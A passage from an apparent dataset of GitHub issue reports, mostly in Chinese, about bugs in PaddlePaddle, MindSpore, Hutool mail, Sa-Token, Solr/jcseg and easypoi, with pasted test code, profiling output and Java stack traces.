dtype=mstype.int64) input_values = Tensor(np.random.randint(10, 30, size=(4,)).astype(np.float32)) input_shape = Tensor(np.random.randint(20, 40, size=(2,)).astype(np.int64)) input_start = Tensor(np.random.randint(1, 5, size=(2,)).astype(np.int64)) input_size = Tensor(np.random.randint(1, 10, size=(2,)).astype(np.int64)) fact = SparseSliceMock( inputs=[input_indices, input_values, input_shape, input_start, input_size]) fact.forward_cmp() &gt; fact.grad_cmp() def test_p_sparseslice_indices_0(): input_indices = Tensor([[0, 1], [1, 2], [1, 3], [2, 2]], dtype=mstype.int64) input_values = Tensor(np.random.randint(10, 30, size=(4,)).astype(np.float32)) input_shape = Tensor(np.random.randint(20, 40, size=(2,)).astype(np.int64)) input_start = Tensor(np.random.randint(1, 5, size=(2,)).astype(np.int64)) input_size = Tensor(np.random.randint(1, 10, size=(2,)).astype(np.int64)) fact = SparseSliceMock( inputs=[input_indices, input_values, input_shape, input_start, input_size]) fact.forward_cmp() &gt; fact.grad_cmp() E ValueError: input_data can not contain zero dimension."
[MS][ME][Control][Inner]grads is not correct,": /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_212_...py second grad is 27 expect second grad is 6 when x = 3 and y = 5   <code>: import numpy as np from mindspore.common import dtype as mstype from mindspore import nn from mindspore import Tensor from mindspore.ops import composite as C from mindspore import context from mindspore.common.parameter import Parameter context.set_context(mode=context.GRAPH_MODE, save_graphs=False, device_target=""Ascend"") class ForwardNetNoAssign(nn.Cell): def __init__(self, max_cycles=10): super(ForwardNetNoAssign, self).__init__() self.max_cycles = max_cycles self.i = Tensor(np.array(0), mstype.int32) self.zero = Tensor(np.array(0), mstype.int32) self.weight = Parameter(Tensor(np.array(0), mstype.int32)) def construct(self, x, y): i = self.i out = self.zero for _ in range(0, self.max_cycles): if out &lt;= 20: out = x * y + out while i &lt; self.max_cycles: out = out + 10 i = i + 1 return out class BackwardNetNoAssign(nn.Cell): def __init__(self, net): super(BackwardNetNoAssign, self).__init__(auto_prefix=False) self.forward_net = net self.grad = C.GradOperation(get_all=True) def construct(self, *inputs): grads = self.grad(self.forward_net)(*inputs) return grads def test_backward_no_assign(): x = Tensor(np.array(3), mstype.int32) y = Tensor(np.array(5), mstype.int32) # Graph Mode context.set_context(mode=context.GRAPH_MODE) graph_forward_net = ForwardNetNoAssign(max_cycles=3) graph_backward_net = BackwardNetNoAssign(graph_forward_net) graph_mode_grads = graph_backward_net(x, y) # Pynative Mode context.set_context(mode=context.PYNATIVE_MODE) pynative_forward_net = ForwardNetNoAssign(max_cycles=3) pynative_backward_net = BackwardNetNoAssign(pynative_forward_net) pynative_mode_grads = pynative_backward_net(x, y) assert graph_mode_grads == pynative_mode_grads"
"accelerate the cuda concat op, avoid many times copy","partly fix https://github.com/PaddlePaddle/Paddle/issues/8567. speed words/s: 2238.753745 -&gt;2927.114484   <code>: -------------------------&gt; Profiling Report &lt;------------------------- Place: CUDA Time unit: ms Sorted by total time in descending order in the same thread Event Calls Total Min. Max. Ave. thread0::while 47 20700.4 287.48 638.011 440.435 thread0::concat 5989 9223.49 0.048768 13.0808 1.54007 thread0::sequence_softmax 2971 2737.77 0.041792 8.53923 0.921498 thread0::mul 32869 2614.54 0.028864 74.3539 0.0795443 thread0::sequence_pool 3018 1135.52 0.031136 5.23907 0.37625 thread0::array_to_lod_tensor 47 988.262 11.4716 26.9624 21.0268 thread0::lod_tensor_to_array 47 980.838 11.2301 27.4485 20.8689 thread0::sequence_expand 2971 672.922 0.028352 4.32195 0.226497 thread0::softmax 2971 593.552 0.042048 4.48938 0.199782 thread0::sum 14855 554.084 0.027488 4.52547 0.0372995 thread0::elementwise_add 14855 520.216 0.02112 4.62784 0.0350196 thread0::shrink_rnn_memory 11884 504.603 0.004416 4.59072 0.0424607 thread0::elementwise_mul 11884 475.482 0.020384 4.70397 0.0400103 thread0::lstm 94 406.33 3.02909 4.8807 4.32266 thread0::write_to_array 9007 246.557 0.003616 5.08422 0.0273739 thread0::tanh 8960 215.664 0.01648 5.01373 0.0240696 thread0::sigmoid 8913 198.42 0.016128 4.36742 0.0222619 thread0::reorder_lod_tensor_by_rank 141 188.17 0.465824 1.82832 1.33454 thread0::read_from_array 8913 169.311 0.01168 4.77021 0.018996 thread0::reshape 2971 105.058 0.026304 4.25789 0.035361 thread0::less_than 3018 37.8448 0.00176 4.4079 0.0125397 thread0::lookup_table 94 11.661 0.06768 0.157824 0.124053 thread0::increment 2971 10.7855 0.00176 0.027904 0.00363027 thread0::mean 47 4.93552 0.063264 0.125184 0.105011 thread0::lod_rank_table 47 2.82765 0.036128 0.07024 0.0601627 thread0::cross_entropy 47 1.72854 0.031968 0.049632 0.0367775 thread0::fill_constant_batch_size_like 47 1.16784 0.021408 0.031424 0.0248477 thread0::feed 141 1.10317 0.005056 0.015488 0.00782389 thread0::fetch 47 1.01466 0.019008 0.0312 0.0215884 thread0::fill_constant 94 0.72048 0.005568 0.013216 0.00766468 thread0::max_sequence_len 47 0.326048 0.005216 0.012416 0.00693719 pass_id=0, test_loss: 6.738341, words/s: 2927.114484, sec/pass: 237.334072"
"cn.hutool.extra.mail.MailUtil.send(MailAccount, Collection<String>, String, String, boolean, File...)报错","使用的JDK版本和Hutool版本 jdk1.8.0 hutool 4.5.16 centos7 cn.hutool.extra.mail.MailUtil.send(MailAccount, Collection, String, String, boolean, File...)报错 #使用 STARTTLS安全连接，STARTTLS是对纯文本通信协议的扩展。 startttlsEnable = false 报一下错误： #使用 STARTTLS安全连接，STARTTLS是对纯文本通信协议的扩展。 startttlsEnable = true 报一下错误：   <code>: Exception in thread ""Thread-7"" cn.hutool.extra.mail.MailException: MessagingException: Could not connect to SMTP host: smtp.163.com, port: 465, response: -1 at cn.hutool.extra.mail.Mail.send(Mail.java:235) at cn.hutool.extra.mail.MailUtil.send(MailUtil.java:211) at cn.hutool.extra.mail.MailUtil.send(MailUtil.java:175) at cn.hutool.extra.mail.MailUtil.send(MailUtil.java:158) at com.lc.ibps.cloud.shutdown.runtime.spi.impl.MailHookService.execute(MailHookService.java:89) at com.lc.ibps.cloud.shutdown.runtime.HookThread.run(HookThread.java:49) Caused by: javax.mail.MessagingException: Could not connect to SMTP host: smtp.163.com, port: 465, response: -1 at com.sun.mail.smtp.SMTPTransport.openServer(SMTPTransport.java:1379) at com.sun.mail.smtp.SMTPTransport.protocolConnect(SMTPTransport.java:412) at javax.mail.Service.connect(Service.java:310) at javax.mail.Service.connect(Service.java:169) at javax.mail.Service.connect(Service.java:118) at javax.mail.Transport.send0(Transport.java:188) at javax.mail.Transport.send(Transport.java:118) at cn.hutool.extra.mail.Mail.doSend(Mail.java:247) at cn.hutool.extra.mail.Mail.send(Mail.java:233) ... 5 more Exception in thread ""Thread-7"" cn.hutool.extra.mail.MailException: MessagingException: 454 Command not permitted when TLS active at cn.hutool.extra.mail.Mail.send(Mail.java:235) at cn.hutool.extra.mail.MailUtil.send(MailUtil.java:211) at cn.hutool.extra.mail.MailUtil.send(MailUtil.java:175) at cn.hutool.extra.mail.MailUtil.send(MailUtil.java:158) at com.lc.ibps.cloud.shutdown.runtime.spi.impl.MailHookService.execute(MailHookService.java:89) at com.lc.ibps.cloud.shutdown.runtime.HookThread.run(HookThread.java:49) Caused by: javax.mail.MessagingException: 454 Command not permitted when TLS active at com.sun.mail.smtp.SMTPTransport.issueCommand(SMTPTransport.java:1481) at com.sun.mail.smtp.SMTPTransport.startTLS(SMTPTransport.java:1331) at com.sun.mail.smtp.SMTPTransport.protocolConnect(SMTPTransport.java:420) at javax.mail.Service.connect(Service.java:310) at javax.mail.Service.connect(Service.java:169) at javax.mail.Service.connect(Service.java:118) at javax.mail.Transport.send0(Transport.java:188) at javax.mail.Transport.send(Transport.java:118) at cn.hutool.extra.mail.Mail.doSend(Mail.java:247) at cn.hutool.extra.mail.Mail.send(Mail.java:233) ... 5 more"
mac 启动项目报错,"中处理当环境是UNIX有问题   <code>: Exception in thread ""main"" java.lang.ExceptionInInitializerError Caused by: java.lang.StringIndexOutOfBoundsException: String index out of range: -1 at java.lang.String.substring(String.java:1967) at com.github.drinkjava2.frog.Application.&lt;clinit&gt;(Application.java:28) Application CLASSPATH"
v2 API集群训练core dump,"v2分布式训练失败报错如下：   <code>: Mon Jul 3 20:01:59 2017[1,0]&lt;stdout&gt;:Pass 0, Batch 0, Cost 1.157251, {'__auc_evaluator_0__': 0.5791015625, 'classification_error_evaluator': 0.4375} Mon Jul 3 20:01:59 2017[1,0]&lt;stderr&gt;:*** Aborted at 1499083319 (unix time) try ""date -d @1499083319"" if you are using GNU date *** Mon Jul 3 20:01:59 2017[1,0]&lt;stderr&gt;:PC: @ 0x0 (unknown) Mon Jul 3 20:01:59 2017[1,0]&lt;stderr&gt;:*** SIGSEGV (@0x8) received by PID 1227 (TID 0x7f492b5fe700) from PID 8; stack trace: *** Mon Jul 3 20:01:59 2017[1,0]&lt;stderr&gt;: @ 0x7f495e753160 (unknown) Mon Jul 3 20:01:59 2017[1,0]&lt;stderr&gt;: @ 0x7f49586f9972 paddle::ProtoClient::recv() Mon Jul 3 20:01:59 2017[1,0]&lt;stderr&gt;: @ 0x7f4958f16126 paddle::ParameterClient2::sendParallel() Mon Jul 3 20:01:59 2017[1,0]&lt;stderr&gt;: @ 0x7f4958801a5c _ZNSt6thread5_ImplISt12_Bind_simpleIFZN6paddle14SyncThreadPool5startEvEUliE_mEEE6_M_runEv Mon Jul 3 20:01:59 2017[1,0]&lt;stderr&gt;: @ 0x7f4957c8a8a0 execute_native_thread_routine Mon Jul 3 20:01:59 2017[1,0]&lt;stderr&gt;: @ 0x7f495e74b1c3 start_thread Mon Jul 3 20:01:59 2017[1,0]&lt;stderr&gt;: @ 0x7f495dd7312d __clone 100 406k 0 406k 0 Mon Jul 3 20:01:59 2017[1,0]&lt;stderr&gt;: @ 0x0 (unknown) 0 3454k 0 --:--:-- --:--:-- --:--:-- 3476k Mon Jul 3 20:01:59 2017[1,0]&lt;stderr&gt;:./train.sh: line 239: 1227 Segmentation fault python27-gcc482/bin/python conf/trainer_config.conf"
多账号认证问题,"多账号认证问题: V1.28 提问： 这个问题是我在从1.26版本升级到1.28版本的时候遇到的问题，关于多账号问题官方给的示例是，我就在想能不能直接继承这个StpUtil然后重写部分代码来避免copy原有里的大量代码。以上的报错是在整合了Gateway做网关统一鉴权的时候报错的。   <code>: Parameter 0 of method setStpLogic in cn.dev33.satoken.reactor.spring.SaBeanInject required a single bean, but 6 were found: - book-member: defined in file [E:\IdeaProjects\cloud\common\target\classes\org\lionel\auth\BookMemAuthEntity.class] - book-sys: defined in file [E:\IdeaProjects\cloud\common\target\classes\org\lionel\auth\BookSysAuthEntity.class] - member: defined in file [E:\IdeaProjects\cloud\common\target\classes\org\lionel\auth\MemberAuthEntity.class] - userAuthEntity: defined in file [E:\IdeaProjects\cloud\common\target\classes\org\lionel\auth\UserAuthEntity.class] - we-member: defined in file [E:\IdeaProjects\cloud\common\target\classes\org\lionel\auth\WeMemAuthEntity.class] - we-sys: defined in file [E:\IdeaProjects\cloud\common\target\classes\org\lionel\auth\WeSysAuthEntity.class] 将StpUtil.java类的全部代码复制粘贴到 StpUserUtil.java里 StpUtil @Component(value = ""we-member"") public class WeMemAuthEntity extends StpLogic { /** * 初始化StpLogic, 并指定账号类型 * * @param loginType 账号体系标识 */ public static final String LOGIN_TYPE = ""we-member""; public WeMemAuthEntity() { super(LOGIN_TYPE); } @Override public String splicingKeyTokenName() { return super.splicingKeyTokenName() + ""-we_member""; } }"
FP32 latency growth for ERNIE model,"Using application: which is get from the repository: https://github.com/PaddlePaddle/benchmark.git for measuring latency it can be observed that latency grows significant (so performance drops) and permanently starting from the commit: f9066e6a6fcfaea2c7bdf19762eb630c7a0a7985 This observation is for <em>fp32</em> only There were more latency growths before but from the mentioned commit this not getting better   <code>: cd /root/models/benchmark/Inference/c++/ernie KMP_AFFINITY=granularity=fine,compact,1,0 KMP_BLOCKTIME=1 ./run.sh -1 1 /data/PaddlePaddle/trained_models/ERNIE/ernie_fp32_model /data/PaddlePaddle/datasets/ernie/Ernie_dataset/1.8w.bs1"
add plot cost in v2 api,"效果见：image demo code   <code>: import paddle.v2.plot.plot_curve as plot_curve plot_cost = plot_curve.PlotCost() step = 0 def event_handler(event): global step if isinstance(event, paddle.event.EndIteration): if step % 10 == 0: # every 10 batches, record a train cost plot_cost.append_train_cost(step, event.cost) if step % 10 == 0: # every 1000 batches, record a test cost result = trainer.test( reader=paddle.batch( uci_housing.test(), batch_size=2), feeding=feeding) plot_cost.append_test_cost(step, result.cost) if step % 100 == 0: # every 100 batches, update cost plot plot_cost.plot() step += 1"
训练报错：Check failed: PySequence_Check(seq_) 求解,"网络结构： 数据1 --- hidden_layer1_1(fc) 数据2 --- hidden_layer1_2(fc) --- hidden_layer2(fc) --- softmax(fc) 数据3 --- hidden_layer1_3(fc) 请问可能是什么问题？   <code>: I0110 18:31:53.190239 32757 Util.cpp:155] commandline: /home/iknow/lianjie/paddle/paddle_internal_release_tools/idl/paddle/output/bin/../opt/paddle/bin/paddle_trainer - -config=trainer_config.py --save_dir=./output --trainer_count=7 --log_period=1000 --num_passes=20 --use_gpu=false --show_parameter_stats_period=500 --test_all_data_in_o ne_period=1 --dot_period=20 --saving_period=1 --num_gradient_servers=1 I0110 18:31:53.190439 32757 Util.cpp:130] Calling runInitFunctions I0110 18:31:53.190767 32757 Util.cpp:143] Call runInitFunctions done. [INFO 2017-01-10 18:31:56,460 networks.py:1466] The input order is [word_data, bi_data, tag_data, label] [INFO 2017-01-10 18:31:56,461 networks.py:1472] The output order is [__cost_0__] I0110 18:31:56.835767 32757 Trainer.cpp:170] trainer mode: Normal I0110 18:31:59.025571 32757 PyDataProvider2.cpp:257] loading dataprovider dataprovider::process I0110 18:31:59.658323 32757 PyDataProvider2.cpp:257] loading dataprovider dataprovider::process I0110 18:31:59.658658 32757 GradientMachine.cpp:134] Initing parameters.. I0110 18:32:04.380216 32757 GradientMachine.cpp:141] Init parameters done. I0110 18:40:53.452157 9687 ThreadLocal.cpp:37] thread use undeterministic rand seed:9688 F0110 18:40:53.452644 9687 PythonUtil.h:211] Check failed: PySequence_Check(seq_) *** Check failure stack trace: *** @ 0x13c2f98 google::LogMessage::Fail() @ 0x13c2ef0 google::LogMessage::SendToLog() @ 0x13c2985 google::LogMessage::Flush() @ 0x13c5746 google::LogMessageFatal::~LogMessageFatal() @ 0x69a829 paddle::py::SequenceHelper::SequenceHelper() @ 0x69ff70 paddle::PyDataProvider2::getNextBatchInternal() @ 0x6a9fe9 paddle::DoubleBuffer::asyncLoadBatch() @ 0x7f52f20628a0 execute_native_thread_routine @ 0x7f52f28e01c3 start_thread @ 0x7f52f17d312d __clone /home/iknow/lianjie/paddle/paddle_internal_release_tools/idl/paddle/output/bin/paddle_local: line 109: 32757 Aborted (core dumped) ${DEBUGGER} $MYDIR/.. /opt/paddle/bin/paddle_trainer ${@:2}"
"Sum operator should support int, int64","As a basic math operator, the sum operator should support double/float/int/int64, since could be used in many situation. Some of them, needs int/int64. For example, accumulate the number of correct samples while training   <code>: sum"
solr中jcseg-analyzer报异常（search模式）,"Type Exception Report Message Request processing failed; nested exception is org.apache.solr.client.solrj.impl.HttpSolrClient$RemoteSolrException: Error from server at http://localhost:8984/solr/mshop_goods: Exception writing document id 6503 to the index; possible analysis error: startOffset must be non-negative, and endOffset must be &gt;= startOffset, and offsets must not go backwards startOffset=0,endOffset=1,lastStartOffset=6 for field 'commonName' Description The server encountered an unexpected condition that prevented it from fulfilling the request. Exception org.springframework.web.util.NestedServletException: Request processing failed; nested exception is org.apache.solr.client.solrj.impl.HttpSolrClient$RemoteSolrException: Error from server at http://localhost:8984/solr/mshop_goods: Exception writing document id 6503 to the index; possible analysis error: startOffset must be non-negative, and endOffset must be &gt;= startOffset, and offsets must not go backwards startOffset=0,endOffset=1,lastStartOffset=6 for field 'commonName' org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:981) org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:860) javax.servlet.http.HttpServlet.service(HttpServlet.java:624) org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:845) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:61) org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) org.apache.shiro.web.servlet.AbstractShiroFilter.executeChain(AbstractShiroFilter.java:449) org.apache.shiro.web.servlet.AbstractShiroFilter$1.call(AbstractShiroFilter.java:365) org.apache.shiro.subject.support.SubjectCallable.doCall(SubjectCallable.java:90) org.apache.shiro.subject.support.SubjectCallable.call(SubjectCallable.java:83) org.apache.shiro.subject.support.DelegatingSubject.execute(DelegatingSubject.java:383) org.apache.shiro.web.servlet.AbstractShiroFilter.doFilterInternal(AbstractShiroFilter.java:362) org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:346) org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:262) com.thetransactioncompany.cors.CORSFilter.doFilter(CORSFilter.java:209) com.thetransactioncompany.cors.CORSFilter.doFilter(CORSFilter.java:244) Root Cause org.apache.solr.client.solrj.impl.HttpSolrClient$RemoteSolrException: Error from server at http://localhost:8984/solr/mshop_goods: Exception writing document id 6503 to the index; possible analysis error: startOffset must be non-negative, and endOffset must be &gt;= startOffset, and offsets must not go backwards startOffset=0,endOffset=1,lastStartOffset=6 for field 'commonName' org.apache.solr.client.solrj.impl.HttpSolrClient.executeMethod(HttpSolrClient.java:643) org.apache.solr.client.solrj.impl.HttpSolrClient.request(HttpSolrClient.java:255) org.apache.solr.client.solrj.impl.HttpSolrClient.request(HttpSolrClient.java:244) org.apache.solr.client.solrj.SolrRequest.process(SolrRequest.java:194) org.apache.solr.client.solrj.SolrClient.add(SolrClient.java:173) org.apache.solr.client.solrj.SolrClient.add(SolrClient.java:138) org.apache.solr.client.solrj.SolrClient.add(SolrClient.java:152) cn.baibo.mshop.service.impl.OrderServiceImpl.addGoodsSolrInfo(OrderServiceImpl.java:291) sun.reflect.GeneratedMethodAccessor263.invoke(Unknown Source) sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) java.lang.reflect.Method.invoke(Method.java:498) org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:302) org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:202) com.sun.proxy.$Proxy66.addGoodsSolrInfo(Unknown Source) cn.baibo.mshop.order.controller.OrderController.addGoodsSolrInfo(OrderController.java:230) cn.baibo.mshop.order.controller.OrderController$$FastClassBySpringCGLIB$$46d471fd.invoke() org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:204) org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:720) org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:157) org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:92) org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:179) org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:655) cn.baibo.mshop.order.controller.OrderController$$EnhancerBySpringCGLIB$$e639c5d0.addGoodsSolrInfo() sun.reflect.GeneratedMethodAccessor252.invoke(Unknown Source) sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) java.lang.reflect.Method.invoke(Method.java:498) org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:222) org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:137) org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:110) org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:814) org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:737) org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:85) org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:959) org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:893) org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:969) org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:860) javax.servlet.http.HttpServlet.service(HttpServlet.java:624) org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:845) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:61) org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) org.apache.shiro.web.servlet.AbstractShiroFilter.executeChain(AbstractShiroFilter.java:449) org.apache.shiro.web.servlet.AbstractShiroFilter$1.call(AbstractShiroFilter.java:365) org.apache.shiro.subject.support.SubjectCallable.doCall(SubjectCallable.java:90) org.apache.shiro.subject.support.SubjectCallable.call(SubjectCallable.java:83) org.apache.shiro.subject.support.DelegatingSubject.execute(DelegatingSubject.java:383) org.apache.shiro.web.servlet.AbstractShiroFilter.doFilterInternal(AbstractShiroFilter.java:362) org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:346) org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:262) com.thetransactioncompany.cors.CORSFilter.doFilter(CORSFilter.java:209) com.thetransactioncompany.cors.CORSFilter.doFilter(CORSFilter.java:244)   <code>: solr 7.3.1 jcseg 2.4.0"
不明确是否版本问题的原因 发生错误:Caused by: java.lang.NoSuchMethodError: org.apache.poi.ss.usermodel.CellStyle.setAlignment(S)V,"原版本: springboot 1.5.9 easypoi-start 3.2.0 现版本: springboot 2.0.5 easypoi-start 3.3.0 原版本没有问题的 新版本使用方法: 运行后在 cn.afterturn.easypoi.excel.export.ExcelExportService 中的 insertDataToSheet 方法中发生报错 具体代码行为: // 创建表格样式 错误原因: 堆栈全部信息:   <code>: public static void exportExcel(List&lt;?&gt; list, String title, String sheetName, Class&lt;?&gt; pojoClass, String fileName, HttpServletResponse response) { defaultExport(list, pojoClass, fileName, response, new ExportParams(title, sheetName)); } private static void defaultExport(List&lt;?&gt; list, Class&lt;?&gt; pojoClass, String fileName, HttpServletResponse response, ExportParams exportParams) { Workbook workbook = ExcelExportUtil.exportExcel(exportParams, pojoClass, list); if(workbook != null) { downLoadExcel(fileName, response, workbook); } } setExcelExportStyler((IExcelExportStyler) entity.getStyle() .getConstructor(Workbook.class).newInstance(workbook)); Caused by: java.lang.NoSuchMethodError: org.apache.poi.ss.usermodel.CellStyle.setAlignment(S)V cn.afterturn.easypoi.exception.excel.ExcelExportException: Excel导出错误 at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) [spring-webmvc-5.0.8.RELEASE.jar:5.0.8.RELEASE] at cn.afterturn.easypoi.excel.export.ExcelExportService.createSheet(ExcelExportService.java:183) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:991) [spring-webmvc-5.0.8.RELEASE.jar:5.0.8.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:925) [spring-webmvc-5.0.8.RELEASE.jar:5.0.8.RELEASE] at cn.afterturn.easypoi.excel.ExcelExportUtil.exportExcel(ExcelExportUtil.java:87) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:974) [spring-webmvc-5.0.8.RELEASE.jar:5.0.8.RELEASE] at com.zhx.tool.utils.excel.CommonExcelUtil.defaultExport(CommonExcelUtil.java:48) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:866) [spring-webmvc-5.0.8.RELEASE.jar:5.0.8.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:635) [servlet-api.jar:na] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:851) [spring-webmvc-5.0.8.RELEASE.jar:5.0.8.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:742) [servlet-api.jar:na] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) [catalina.jar:8.5.24] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [catalina.jar:8.5.24] at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) [tomcat-websocket.jar:8.5.24] at com.zhx.tool.utils.excel.CommonExcelUtil.exportExcel(CommonExcelUtil.java:38) at com.yglink.community.app.DetailRepairController.exportModel(DetailRepairController.java:141) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [catalina.jar:8.5.24] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [catalina.jar:8.5.24] at com.yglink.community.app.DetailRepairController$$FastClassBySpringCGLIB$$82b10e65.invoke(&lt;generated&gt;) at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:123) [druid-1.1.10.jar:1.1.10] at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:204) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [catalina.jar:8.5.24] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:746) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [catalina.jar:8.5.24] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:92) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:101) [spring-web-5.0.8.RELEASE.jar:5.0.8.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:185) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [catalina.jar:8.5.24] at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:688) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [catalina.jar:8.5.24] at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:123) [druid-1.1.10.jar:1.1.10] at com.yglink.community.app.DetailRepairController$$EnhancerBySpringCGLIB$$cbffe50d.exportModel(&lt;generated&gt;) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [catalina.jar:8.5.24] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [catalina.jar:8.5.24] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at org.springframework.boot.actuate.web.trace.servlet.HttpTraceFilter.doFilterInternal(HttpTraceFilter.java:90) [spring-boot-actuator-2.0.5.RELEASE.jar:2.0.5.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-5.0.8.RELEASE.jar:5.0.8.RELEASE] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [catalina.jar:8.5.24] at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [catalina.jar:8.5.24] at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:209) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:320) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:136) at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:127) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:102) at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:91) [spring-security-web-5.0.7.RELEASE.jar:5.0.7.RELEASE] at 